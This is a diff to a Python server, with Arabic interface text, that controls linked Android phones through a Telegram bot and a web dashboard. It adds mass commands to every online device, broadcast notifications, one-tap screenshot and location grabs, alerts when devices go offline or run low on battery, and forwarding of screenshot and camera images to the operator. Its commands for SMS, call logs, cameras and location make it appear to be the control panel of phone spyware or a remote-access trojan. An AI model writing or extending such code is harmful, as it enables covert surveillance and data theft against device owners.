@@ -108,6 +108,17 @@ _file_lock = threading.Lock()
 RATE_LIMIT_SECONDS = 1
 # حد أدنى بين إنشاء أكواد الربط (بالثواني)
 LINK_CODE_RATE_LIMIT = 3
+# Per-user rate limiting: max commands per minute
+USER_RATE_LIMIT_MAX = 20
+USER_RATE_LIMIT_WINDOW = 60  # seconds
+_user_command_timestamps = {}  # chat_id -> [timestamps]
+# Device state tracking for alerts
+_device_last_online_state = {}  # device_id -> bool (last known active state)
+_device_last_battery_alert = {}  # device_id -> timestamp of last low-battery alert sent
+LOW_BATTERY_THRESHOLD = 15  # percent
+# Batch operation tracking
+_batch_operations = {}  # batch_id -> {"total": int, "responded": int, "chat_id": int, "msg_id": int, "created_at": float}
+DEVICE_OFFLINE_TIMEOUT = 120  # seconds without heartbeat before considering offline
 
 # ============================================================================
 # 200+ COMMAND REGISTRY - organized by category
@@ -901,6 +912,29 @@ async def edit_message_text(chat_id, message_id, text, parse_mode="HTML", reply_
         payload["reply_markup"] = reply_markup
     return await tg_request("editMessageText", payload)
 
+
+async def update_batch_progress(batch_id):
+    """Update batch operation progress message in Telegram."""
+    batch = _batch_operations.get(batch_id)
+    if not batch or not batch.get("msg_id"):
+        return
+    elapsed = int(time.time() - batch.get("created_at", time.time()))
+    total = batch["total"]
+    responded = batch["responded"]
+    icon = "✅" if responded >= total else "⏳"
+    btype = "📢 إرسال عام" if batch.get("type") == "broadcast" else "🔄 أمر جماعي"
+    text = (
+        f"{icon} <b>{btype}</b>\n\n"
+        f"📊 التقدم: <b>{responded}/{total}</b> أجهزة استجابت\n"
+        f"⏱️ الوقت: {elapsed} ثانية"
+    )
+    if responded >= total:
+        text += f"\n\n✅ تم الانتهاء!"
+    try:
+        await edit_message_text(batch["chat_id"], batch["msg_id"], text)
+    except Exception as e:
+        log.warning("Failed to update batch progress: %s", e)
+
 # ============================================================================
 # INLINE KEYBOARD BUILDERS
 # ============================================================================
@@ -932,6 +966,38 @@ def build_back_button(target="back_main"):
     return {"inline_keyboard": [[ib("🔙 رجوع", target)]]}
 
 
+def check_user_rate_limit(chat_id):
+    """Check if user is within rate limit. Returns True if allowed, False if rate limited."""
+    now = time.time()
+    chat_key = str(chat_id)
+    timestamps = _user_command_timestamps.get(chat_key, [])
+    # Remove timestamps outside the window
+    timestamps = [t for t in timestamps if now - t < USER_RATE_LIMIT_WINDOW]
+    if len(timestamps) >= USER_RATE_LIMIT_MAX:
+        _user_command_timestamps[chat_key] = timestamps
+        return False
+    timestamps.append(now)
+    _user_command_timestamps[chat_key] = timestamps
+    # Periodic cleanup
+    if len(timestamps) == 1:
+        expired_keys = [k for k, v in _user_command_timestamps.items() if not v or now - v[-1] > USER_RATE_LIMIT_WINDOW * 2]
+        for k in expired_keys:
+            del _user_command_timestamps[k]
+    return True
+
+
+def build_quick_actions_menu(device_id):
+    """Build inline keyboard with quick action buttons for a device."""
+    return {
+        "inline_keyboard": [
+            [ib("📸 لقطة شاشة", f"quick_screenshot_{device_id}"), ib("📍 الموقع", f"quick_location_{device_id}")],
+            [ib("🔋 البطارية", f"quick_battery_{device_id}"), ib("ℹ️ معلومات الجهاز", f"quick_info_{device_id}")],
+            [ib("📱 التطبيقات", f"quick_apps_{device_id}")],
+            [ib("🔙 رجوع", f"dev_{device_id}")],
+        ]
+    }
+
+
 def build_devices_menu():
     devices = get_devices()
     rows = []
@@ -949,6 +1015,7 @@ def build_devices_menu():
 def build_device_menu(device_id):
     return {
         "inline_keyboard": [
+            [ib("⚡ إجراءات سريعة", f"quick_actions_{device_id}")],
             [ib("ℹ️ معلومات الجهاز", f"cmd_info_{device_id}")],
             [ib("🔋 البطارية", f"cmd_battery_{device_id}"), ib("📍 الموقع", f"cmd_location_{device_id}")],
             [ib("📲 الرسائل", f"cmd_sms_{device_id}"), ib("📞 المكالمات", f"cmd_calls_{device_id}")],
@@ -1074,6 +1141,8 @@ def build_help_menu():
     
     text += "📱 /devices - قائمة الأجهزة\n🔗 /link - ربط جهاز\n"
     text += "📋 /menu - القائمة الرئيسية\n📊 /status - الحالة\n"
+    text += "🔍 /search - بحث الأجهزة\n📊 /stats - الإحصائيات\n"
+    text += "🔄 /all - أمر جماعي\n📢 /broadcast - إرسال عام\n"
     return text
 
 # ============================================================================
@@ -1143,6 +1212,11 @@ async def handle_telegram_command(chat_id, text, message_id=None):
         log.warning("Rate limited: %s from %s", cmd, chat_id)
         return
     _last_message_time[chat_id] = now
+
+    # === Per-user rate limiting (20 commands per minute) ===
+    if not check_user_rate_limit(chat_id):
+        await send_message(chat_id, f"⏳ <b>تم تقييد السرعة</b>\n\nأنت تجاوزت الحد المسموح ({USER_RATE_LIMIT_MAX} أمر/دقيقة).\nيرجى الانتظار قليلاً ثم المحاولة مرة أخرى.", reply_markup=build_back_button())
+        return
 
     # Resolve device_id
     dev_id = arg1
@@ -1230,19 +1304,50 @@ async def handle_telegram_command(chat_id, text, message_id=None):
         devices = get_devices()
         online = sum(1 for d in devices if d.get("active"))
         cmds = load_json(COMMANDS_FILE, [])
+        events = load_json(EVENTS_FILE, [])
+        today_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")
+        cmds_today = sum(1 for c in cmds if c.get("created_at", "").startswith(today_str))
+        events_today = sum(1 for e in events if e.get("time", "").startswith(today_str))
         pending = sum(1 for c in cmds if c.get("status") == "pending")
-        done = sum(1 for c in cmds if c.get("status") == "completed")
+        done = sum(1 for c in cmds if c.get("status") in ("completed", "success"))
         text = (
-            "📈 <b>الإحصائيات</b>\n\n"
-            f"📱 الأجهزة: {len(devices)} (🟢 {online})\n"
-            f"📋 إجمالي الأوامر: {len(cmds)}\n"
-            f"⏳ معلّق: {pending}\n"
-            f"✅ مكتمل: {done}\n"
+            "📊 <b>لوحة الإحصائيات</b>\n\n"
+            f"📱 الأجهزة: <b>{len(devices)}</b> (🟢 {online} متصل | 🔴 {len(devices)-online} غير متصل)\n"
+            f"📋 الأوامر اليوم: <b>{cmds_today}</b>\n"
+            f"⏳ معلّق: {pending} | ✅ مكتمل: {done}\n"
+            f"📝 الأحداث اليوم: <b>{events_today}</b>\n"
             f"📨 الرسائل المرسلة: {messages_sent}\n"
             f"📡 طلبات API: {api_hits}\n"
-            f"⏱️ وقت التشغيل: {format_uptime(get_uptime())}"
+            f"⏱️ وقت التشغيل: <b>{format_uptime(get_uptime())}</b>\n"
+            f"🖥️ الإصدار: <b>v3.4</b>"
         )
         await send_message(chat_id, text, reply_markup=build_back_button())
+    elif cmd == "/search":
+        query = " ".join(parts[1:]) if len(parts) > 1 else ""
+        if not query:
+            await send_message(chat_id, "🔍 <b>بحث الأجهزة</b>\n\nالاستخدام: /search <كلمة البحث>\n\nيبحث بالاسم، الموديل، أو معرف الجهاز.", reply_markup=build_back_button())
+            return
+        devices = get_devices()
+        query_lower = query.lower()
+        results = [d for d in devices if
+                   query_lower in d.get("name", "").lower() or
+                   query_lower in d.get("model", "").lower() or
+                   query_lower in d.get("id", "").lower() or
+                   query_lower in d.get("brand", "").lower()]
+        if not results:
+            await send_message(chat_id, f"🔍 لم يتم العثور على أجهزة تطابق: <code>{query}</code>", reply_markup=build_back_button())
+        else:
+            kb_rows = []
+            for d in results:
+                status = "🟢" if d.get("active") else "🔴"
+                name = d.get("name", d.get("id", "مجهول"))
+                model = d.get("model", "")
+                label = f"{status} {name}"
+                if model and model != name:
+                    label += f" ({model})"
+                kb_rows.append([ib(label, f"dev_{d['id']}")])
+            kb_rows.append([ib("🔙 رجوع", "back_main")])
+            await send_message(chat_id, f"🔍 <b>نتائج البحث</b> ({len(results)} جهاز)\n\nكلمة البحث: <code>{query}</code>", reply_markup={"inline_keyboard": kb_rows})
     elif cmd == "/logs":
         events = load_json(EVENTS_FILE, [])[-20:]
         text = "📝 <b>السجلات الأخيرة</b>\n\n"
@@ -1268,7 +1373,99 @@ async def handle_telegram_command(chat_id, text, message_id=None):
     elif cmd == "/remove_admin":
         await send_admin("الميزة غير متاحة في وضع الأدمن الواحد", reply_markup=build_back_button())
     elif cmd == "/broadcast":
-        await send_admin("لا يوجد مستخدمون آخرون للإرسال", reply_markup=build_back_button())
+        message_text = " ".join(parts[1:]) if len(parts) > 1 else ""
+        if not message_text:
+            await send_message(chat_id, "📢 <b>إرسال عام</b>\n\nالاستخدام: /broadcast <الرسالة>\n\nسيتم إرسال إشعار لجميع الأجهزة المتصلة.", reply_markup=build_back_button())
+            return
+        devices = get_devices()
+        online_devices = [d for d in devices if d.get("active")]
+        if not online_devices:
+            await send_message(chat_id, "❌ لا توجد أجهزة متصلة حالياً.", reply_markup=build_back_button())
+            return
+        batch_id = str(uuid.uuid4())[:8]
+        _batch_operations[batch_id] = {
+            "total": len(online_devices),
+            "responded": 0,
+            "chat_id": chat_id,
+            "msg_id": None,
+            "created_at": time.time(),
+            "command": "show_notification",
+            "type": "broadcast",
+        }
+        for d in online_devices:
+            cmd = queue_command(d["id"], "show_notification", {"arg": message_text})
+            # Track batch membership on each command
+            _pending_messages[cmd["id"]] = {
+                "chat_id": chat_id,
+                "message_id": None,
+                "created_at": time.time(),
+                "batch_id": batch_id,
+            }
+        resp = await send_message(
+            chat_id,
+            f"📢 <b>إرسال عام</b>\n\n"
+            f"📨 الرسالة: <code>{message_text[:200]}</code>\n"
+            f"📱 الأجهزة المستهدفة: {len(online_devices)}\n"
+            f"⏳ بانتظار الاستجابة... (0/{len(online_devices)})",
+            reply_markup=build_back_button()
+        )
+        if resp and resp.get("ok"):
+            _batch_operations[batch_id]["msg_id"] = resp["result"]["message_id"]
+        append_event("Broadcast sent", {"devices": len(online_devices), "message": message_text[:100]})
+    elif cmd == "/all":
+        subcmd = arg1
+        if not subcmd:
+            await send_message(chat_id,
+                "🔄 <b>أمر جماعي لجميع الأجهزة</b>\n\n"
+                "الاستخدام: /all <أمر>\n\n"
+                "مثال:\n"
+                "  /all screenshot\n"
+                "  /all location\n"
+                "  /all battery\n"
+                "  /all info\n"
+                "  /all ping\n\n"
+                "⚠️ سيتم إرسال الأمر لجميع الأجهزة <b>المتصلة</b> فقط.",
+                reply_markup=build_back_button())
+            return
+        # Validate it's a known command
+        reg = COMMAND_REGISTRY.get(subcmd)
+        if not reg:
+            await send_message(chat_id, f"❌ أمر غير معروف: <code>{subcmd}</code>\n\nاستخدم /help لعرض قائمة الأوامر المتاحة.", reply_markup=build_back_button())
+            return
+        devices = get_devices()
+        online_devices = [d for d in devices if d.get("active")]
+        if not online_devices:
+            await send_message(chat_id, "❌ لا توجد أجهزة متصلة حالياً.", reply_markup=build_back_button())
+            return
+        batch_id = str(uuid.uuid4())[:8]
+        _batch_operations[batch_id] = {
+            "total": len(online_devices),
+            "responded": 0,
+            "chat_id": chat_id,
+            "msg_id": None,
+            "created_at": time.time(),
+            "command": reg["cmd"],
+            "type": "batch",
+        }
+        for d in online_devices:
+            cmd = queue_command(d["id"], reg["cmd"])
+            _pending_messages[cmd["id"]] = {
+                "chat_id": chat_id,
+                "message_id": None,
+                "created_at": time.time(),
+                "batch_id": batch_id,
+            }
+        resp = await send_message(
+            chat_id,
+            f"🔄 <b>أمر جماعي</b>\n\n"
+            f"📋 الأمر: {reg['desc']}\n"
+            f"📱 الأجهزة المستهدفة: {len(online_devices)}\n"
+            f"⏳ بانتظار الاستجابة... (0/{len(online_devices)})",
+            reply_markup=build_back_button()
+        )
+        if resp and resp.get("ok"):
+            _batch_operations[batch_id]["msg_id"] = resp["result"]["message_id"]
+        append_event("Batch command", {"command": subcmd, "devices": len(online_devices)})
     elif cmd == "/maintenance":
         s = load_settings()
         s["maintenance"] = not s.get("maintenance", False)
@@ -1683,6 +1880,53 @@ async def handle_callback_query(callback):
                 await answer_callback_query(cb_id)
                 return
 
+        # ── Quick Actions ──
+        if data.startswith("quick_actions_"):
+            device_id = data[len("quick_actions_"):]
+            d = find_device(device_id)
+            name = d.get("name", device_id) if d else device_id
+            await edit_message_text(chat_id, message_id,
+                f"⚡ <b>إجراءات سريعة</b> - {name}\n\nاختر إجراء سريع:",
+                reply_markup=build_quick_actions_menu(device_id))
+            await answer_callback_query(cb_id)
+            return
+
+        if data.startswith("quick_"):
+            remainder = data[6:]  # Remove "quick_"
+            for d in get_devices():
+                did = d["id"]
+                if remainder.endswith(f"_{did}"):
+                    action = remainder[:-len(f"_{did}")]
+                    quick_cmd_map = {
+                        "screenshot": "screenshot",
+                        "location": "get_location",
+                        "battery": "get_battery",
+                        "info": "get_info",
+                        "apps": "get_apps",
+                    }
+                    actual_cmd = quick_cmd_map.get(action)
+                    if actual_cmd:
+                        await execute_device_command(chat_id, did, actual_cmd, msg_id=message_id)
+                        action_labels = {
+                            "screenshot": "📸 لقطة شاشة",
+                            "location": "📍 الموقع",
+                            "battery": "🔋 البطارية",
+                            "info": "ℹ️ معلومات الجهاز",
+                            "apps": "📱 التطبيقات",
+                        }
+                        await answer_callback_query(cb_id, f"⏳ {action_labels.get(action, action)}")
+                    else:
+                        await answer_callback_query(cb_id, "إجراء غير معروف", show_alert=True)
+                    return
+            await answer_callback_query(cb_id, "جهاز غير معروف", show_alert=True)
+            return
+
+        # ── Search select ──
+        if data.startswith("search_"):
+            # Reserved for future search pagination/selection
+            await answer_callback_query(cb_id)
+            return
+
         await answer_callback_query(cb_id)
     except Exception as exc:
         log.error("Callback error: %s - %s", exc, traceback.format_exc())
@@ -1728,6 +1972,9 @@ async def api_verify_link(request):
         add_device(device_data)
         await consume_link_code(code, device_id)
 
+        # Initialize online state tracking for alerts
+        _device_last_online_state[device_id] = True
+
         # === إشعار الأدمن بأن جهاز جديد تم ربطه ===
         try:
             await send_admin(
@@ -1741,6 +1988,7 @@ async def api_verify_link(request):
             )
         except Exception as e:
             log.error("Failed to notify admin: %s", e)
+        append_event("New device linked", {"device_id": device_id, "model": model, "brand": brand})
 
         return web.json_response({
             "ok": True,
@@ -1914,22 +2162,31 @@ async def api_command_result(request):
                 d = find_device(device_id) if device_id else None
                 dev_name = d.get("name", device_id) if d else (device_id or "مجهول")
 
+                # Parse result and detect images
+                b64_image = None
                 display_text = str(result) if result else "تم بنجاح"
                 if len(display_text) > 4000:
                     display_text = display_text[:4000] + "..."
 
                 try:
                     rj = json.loads(str(result))
-                    if isinstance(rj, dict) and rj.get("ok") and rj.get("message"):
-                        display_text = rj["message"]
-                    elif isinstance(rj, dict) and rj.get("ok") and isinstance(rj.get("data"), list):
-                        count = len(rj["data"])
-                        if count == 0:
-                            display_text = "لا توجد بيانات"
-                        elif count <= 15:
-                            display_text = f"تم بنجاح - {count} عنصر\n\n<code>{json.dumps(rj['data'], ensure_ascii=False, indent=2)[:3000]}</code>"
-                        else:
-                            display_text = f"تم بنجاح - {count} عنصر (أول 10)\n\n<code>{json.dumps(rj['data'][:10], ensure_ascii=False, indent=2)[:2000]}</code>\n\n...و {count-10} أخرى"
+                    if isinstance(rj, dict):
+                        # Check for base64 image
+                        for img_key in ("base64", "base64_preview", "image", "image_data"):
+                            img_val = rj.get(img_key, "")
+                            if img_val and len(img_val) > 1000:
+                                b64_image = img_val
+                                break
+                        if rj.get("ok") and rj.get("message"):
+                            display_text = rj["message"]
+                        elif rj.get("ok") and isinstance(rj.get("data"), list):
+                            count = len(rj["data"])
+                            if count == 0:
+                                display_text = "لا توجد بيانات"
+                            elif count <= 15:
+                                display_text = f"تم بنجاح - {count} عنصر\n\n<code>{json.dumps(rj['data'], ensure_ascii=False, indent=2)[:3000]}</code>"
+                            else:
+                                display_text = f"تم بنجاح - {count} عنصر (أول 10)\n\n<code>{json.dumps(rj['data'][:10], ensure_ascii=False, indent=2)[:2000]}</code>\n\n...و {count-10} أخرى"
                 except Exception:
                     pass
 
@@ -1940,6 +2197,25 @@ async def api_command_result(request):
                         break
 
                 emoji = "✅" if status in ("completed", "success") else ("❌" if status == "error" else "📋")
+
+                # Try to EDIT the pending message first
+                pending = _pending_messages.pop(cmd_id, None)
+                batch_id = pending.get("batch_id") if pending else None
+
+                # === Send image directly for screenshots/camera ===
+                img_sent = False
+                if b64_image and command in ("screenshot", "front_camera", "back_camera"):
+                    try:
+                        import base64 as _b64
+                        img_bytes = _b64.b64decode(b64_image)
+                        if len(img_bytes) > 5000:
+                            caption = f"{emoji} {dev_name} - {cmd_desc}"
+                            photo_resp = await send_photo(ADMIN_CHAT_ID, img_bytes, caption=caption)
+                            if photo_resp and photo_resp.get("ok"):
+                                img_sent = True
+                    except Exception:
+                        pass
+
                 msg = (
                     f"{emoji} <b>نتيجة الأمر</b>\n\n"
                     f"📱 الجهاز: <code>{dev_name}</code>\n"
@@ -1947,10 +2223,11 @@ async def api_command_result(request):
                     f"🆔 المعرف: <code>{cmd_id}</code>\n\n"
                     f"<code>{display_text}</code>"
                 )
-                # Try to EDIT the pending message first
-                pending = _pending_messages.pop(cmd_id, None)
+                if img_sent:
+                    msg = f"{emoji} <b>{cmd_desc}</b>\n📱 <code>{dev_name}</code>\n\n<code>{display_text[:2000]}</code>"
+
                 msg_sent = False
-                if pending:
+                if pending and pending.get("message_id"):
                     try:
                         edit_resp = await edit_message_text(
                             pending["chat_id"], pending["message_id"],
@@ -1961,8 +2238,16 @@ async def api_command_result(request):
                             log.info("API result EDITED pending message: cmd=%s msg_id=%d", cmd_id, pending["message_id"])
                     except Exception as edit_err:
                         log.warning("Edit pending message error for cmd=%s: %s", cmd_id, edit_err)
+
                 if not msg_sent:
-                    await send_admin(msg)
+                    if batch_id and batch_id in _batch_operations:
+                        _batch_operations[batch_id]["responded"] += 1
+                        await update_batch_progress(batch_id)
+                    else:
+                        await send_admin(msg)
+                elif batch_id and batch_id in _batch_operations:
+                    _batch_operations[batch_id]["responded"] += 1
+                    await update_batch_progress(batch_id)
                 log.info("API result FORWARDED to Telegram: cmd=%s", cmd_id)
             except Exception as send_err:
                 log.error("Failed to forward API result: %s", send_err)
@@ -1990,10 +2275,66 @@ async def api_heartbeat(request):
         if not get_device_by_token(device_id, device_token):
             return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
         
+        is_online = status_val == "online"
         update_device(device_id, {
-            "active": status_val == "online",
+            "active": is_online,
             "battery": str(battery),
         })
+
+        # === Real-time alert: online/offline transition ===
+        was_online = _device_last_online_state.get(device_id, None)
+        if was_online is not None and was_online != is_online:
+            d = find_device(device_id)
+            dev_name = d.get("name", device_id) if d else device_id
+            if is_online:
+                try:
+                    await send_admin(
+                        f"🟢 <b>الجهاز متصل</b>\n\n"
+                        f"📱 {dev_name} (<code>{device_id}</code>)\n"
+                        f"🔋 البطارية: {battery}%\n"
+                        f"🕐 {ts()}",
+                        disable_notification=True
+                    )
+                except Exception:
+                    pass
+            else:
+                try:
+                    await send_admin(
+                        f"🔴 <b>الجهاز غير متصل</b>\n\n"
+                        f"📱 {dev_name} (<code>{device_id}</code>)\n"
+                        f"🕐 {ts()}",
+                        disable_notification=True
+                    )
+                except Exception:
+                    pass
+            append_event(f"Device {'online' if is_online else 'offline'}", {"device_id": device_id, "battery": battery})
+        _device_last_online_state[device_id] = is_online
+
+        # === Real-time alert: low battery ===
+        try:
+            battery_int = int(battery)
+            if 0 <= battery_int < LOW_BATTERY_THRESHOLD:
+                last_alert_time = _device_last_battery_alert.get(device_id, 0)
+                now = time.time()
+                # Only alert once every 10 minutes per device
+                if now - last_alert_time >= 600:
+                    d = find_device(device_id)
+                    dev_name = d.get("name", device_id) if d else device_id
+                    try:
+                        await send_admin(
+                            f"⚠️ <b>بطارية منخفضة!</b>\n\n"
+                            f"📱 {dev_name} (<code>{device_id}</code>)\n"
+                            f"🔋 المستوى: <b>{battery_int}%</b>\n"
+                            f"🕐 {ts()}",
+                            disable_notification=True
+                        )
+                    except Exception:
+                        pass
+                    _device_last_battery_alert[device_id] = now
+                    append_event("Low battery alert", {"device_id": device_id, "battery": battery_int})
+        except (ValueError, TypeError):
+            pass
+
         # Track IP for upload identification
         peer_ip = _get_real_ip(request)
         if peer_ip and peer_ip != "127.0.0.1":
@@ -2045,6 +2386,26 @@ async def api_device_data(request):
         elif data_type == "battery":
             level = data.get("level", "?")
             update_device(device_id, {"battery": level})
+            # Low battery alert from data endpoint
+            try:
+                level_int = int(level)
+                if 0 <= level_int < LOW_BATTERY_THRESHOLD:
+                    last_alert_time = _device_last_battery_alert.get(device_id, 0)
+                    now_ts = time.time()
+                    if now_ts - last_alert_time >= 600:
+                        try:
+                            await send_admin(
+                                f"⚠️ <b>بطارية منخفضة!</b>\n\n"
+                                f"📱 {dev_name} (<code>{device_id}</code>)\n"
+                                f"🔋 المستوى: <b>{level_int}%</b>\n"
+                                f"🕐 {ts()}",
+                                disable_notification=True
+                            )
+                        except Exception:
+                            pass
+                        _device_last_battery_alert[device_id] = now_ts
+            except (ValueError, TypeError):
+                pass
         elif data_type == "screenshot" or data_type == "camera":
             img_data = data.get("image", "")
             if img_data and len(img_data) > 100:
@@ -2693,122 +3054,330 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Abu-Zahra Dashboard</title>
 <style>
-:root{--bg:#0a0a0f;--surface:#12121a;--surface2:#1a1a2e;--border:#2a2a3e;--text:#e0e0e0;--text2:#888;--accent:#e63946;--accent2:#ff6b6b;--green:#4ade80;--blue:#60a5fa;--yellow:#fbbf24;--purple:#a78bfa;--radius:12px}
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
-.login-page{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#0a0a0f,#1a1a2e)}
-.login-box{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:40px;width:360px;max-width:90vw;text-align:center}
-.login-box h1{color:var(--accent);margin-bottom:8px;font-size:24px}
-.login-box p{color:var(--text2);margin-bottom:24px;font-size:14px}
-.login-box input{width:100%;padding:12px 16px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:15px;margin-bottom:12px;outline:none;transition:border .2s}
-.login-box input:focus{border-color:var(--accent)}
-.login-box button{width:100%;padding:12px;border:none;border-radius:8px;background:var(--accent);color:#fff;font-size:16px;cursor:pointer;transition:background .2s;font-weight:bold}
-.login-box button:hover{background:var(--accent2)}
-.login-error{color:var(--accent);font-size:13px;margin-top:8px;display:none}
-.app{display:none;min-height:100vh}
-.sidebar{position:fixed;top:0;right:0;width:240px;height:100vh;background:var(--surface);border-left:1px solid var(--border);padding:20px 0;z-index:100;transition:transform .3s}
-.sidebar .logo{padding:0 20px 20px;border-bottom:1px solid var(--border);margin-bottom:16px}
-.sidebar .logo h2{color:var(--accent);font-size:18px}
-.sidebar .logo span{color:var(--text2);font-size:11px}
-.sidebar a{display:flex;align-items:center;padding:12px 20px;color:var(--text2);text-decoration:none;transition:all .2s;cursor:pointer;font-size:14px;gap:10px}
-.sidebar a:hover,.sidebar a.active{background:var(--surface2);color:var(--text)}
-.sidebar a.active{border-right:3px solid var(--accent);color:var(--accent)}
-.main{margin-right:240px;padding:24px;min-height:100vh}
-.page{display:none}
-.page.active{display:block}
-.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
-.topbar h1{font-size:22px;font-weight:600}
-.topbar .time{color:var(--text2);font-size:13px}
-.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
-.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px}
-.stat-card .label{color:var(--text2);font-size:13px;margin-bottom:8px}
-.stat-card .value{font-size:28px;font-weight:700}
-.stat-card .sub{color:var(--text2);font-size:12px;margin-top:4px}
-.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px}
-.card h3{margin-bottom:16px;font-size:16px;display:flex;align-items:center;gap:8px}
-table{width:100%;border-collapse:collapse}
-th,td{padding:10px 12px;text-align:right;border-bottom:1px solid var(--border);font-size:13px}
-th{color:var(--text2);font-weight:500}
-.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600}
-.badge-green{background:#166534;color:var(--green)}
-.badge-red{background:#7f1d1d;color:#fca5a5}
-.badge-yellow{background:#713f12;color:var(--yellow)}
-.badge-blue{background:#1e3a5f;color:var(--blue)}
-.btn{padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-size:13px;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
-.btn-primary{background:var(--accent);color:#fff}
-.btn-primary:hover{background:var(--accent2)}
-.btn-secondary{background:var(--surface2);color:var(--text);border:1px solid var(--border)}
-.btn-sm{padding:6px 12px;font-size:12px}
-.btn-danger{background:#7f1d1d;color:#fca5a5}
-.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px}
-.cmd-btn{padding:10px 14px;border-radius:8px;border:1px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:13px;transition:all .2s;text-align:right}
-.cmd-btn:hover{border-color:var(--accent);background:rgba(230,57,70,.1)}
-.device-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;cursor:pointer;transition:all .2s}
-.device-card:hover{border-color:var(--accent);transform:translateY(-2px)}
-.device-card .name{font-size:16px;font-weight:600;margin-bottom:4px}
-.device-card .meta{color:var(--text2);font-size:12px}
-.device-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
-.log-item{padding:8px 0;border-bottom:1px solid var(--border);font-size:12px;display:flex;gap:12px}
-.log-item .time{color:var(--text2);white-space:nowrap;font-family:monospace}
-.log-item .event{flex:1}
-.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center}
-.modal-overlay.show{display:flex}
-.modal{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:24px;width:500px;max-width:90vw;max-height:80vh;overflow-y:auto}
-.modal h2{margin-bottom:16px;font-size:18px}
-.search-box{display:flex;gap:8px;margin-bottom:16px}
-.search-box input{flex:1;padding:10px 14px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:14px;outline:none}
-.hamburger{display:none;position:fixed;top:16px;right:16px;z-index:150;background:var(--accent);color:#fff;border:none;width:40px;height:40px;border-radius:8px;font-size:20px;cursor:pointer}
-@media(max-width:768px){
-.sidebar{transform:translateX(100%)}
-.sidebar.open{transform:translateX(0)}
-.main{margin-right:0;padding:16px;padding-top:60px}
-.hamburger{display:block}
-.stats-grid{grid-template-columns:repeat(2,1fr)}
-.device-cards{grid-template-columns:1fr}
-.cmd-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr))}
+/* ========== CSS Custom Properties / Theme ========== */
+:root {
+  --bg: #0d1117;
+  --bg-light: #161b22;
+  --surface: #1c2128;
+  --surface2: #21262d;
+  --surface-hover: #292e36;
+  --border: #30363d;
+  --border-light: #484f58;
+  --text: #e6edf3;
+  --text-secondary: #8b949e;
+  --text-muted: #656d76;
+  --accent: #e63946;
+  --accent-hover: #ff4d5a;
+  --green: #3fb950;
+  --green-bg: rgba(63,185,80,.12);
+  --red: #f85149;
+  --red-bg: rgba(248,81,73,.12);
+  --yellow: #d29922;
+  --yellow-bg: rgba(210,153,34,.12);
+  --blue: #58a6ff;
+  --blue-bg: rgba(88,166,255,.12);
+  --purple: #bc8cff;
+  --purple-bg: rgba(188,140,255,.12);
+  --orange: #f0883e;
+  --radius: 12px;
+  --radius-sm: 8px;
+  --radius-xs: 6px;
+  --shadow: 0 1px 3px rgba(0,0,0,.3), 0 1px 2px rgba(0,0,0,.2);
+  --shadow-lg: 0 10px 25px rgba(0,0,0,.4);
+  --transition: .2s cubic-bezier(.4,0,.2,1);
+  --sidebar-width: 260px;
+  --topbar-height: 56px;
 }
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Tahoma,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5;-webkit-font-smoothing:antialiased}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--text-muted)}
+input,select,textarea,button{font-family:inherit}
+a{text-decoration:none;color:inherit}
+
+/* ========== Login ========== */
+.login-page{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,var(--bg) 0%,#1a1a2e 50%,#16213e 100%);position:relative;overflow:hidden}
+.login-page::before{content:'';position:absolute;width:600px;height:600px;border-radius:50%;background:radial-gradient(circle,rgba(230,57,70,.08),transparent 70%);top:-200px;right:-200px;pointer-events:none}
+.login-box{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:40px 36px;width:380px;max-width:90vw;text-align:center;box-shadow:var(--shadow-lg);position:relative;z-index:1}
+.login-box h1{color:var(--accent);margin-bottom:6px;font-size:26px;font-weight:700;letter-spacing:-.5px}
+.login-box p{color:var(--text-secondary);margin-bottom:28px;font-size:14px}
+.login-box input{width:100%;padding:12px 16px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:15px;margin-bottom:12px;outline:none;transition:border var(--transition)}
+.login-box input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(230,57,70,.15)}
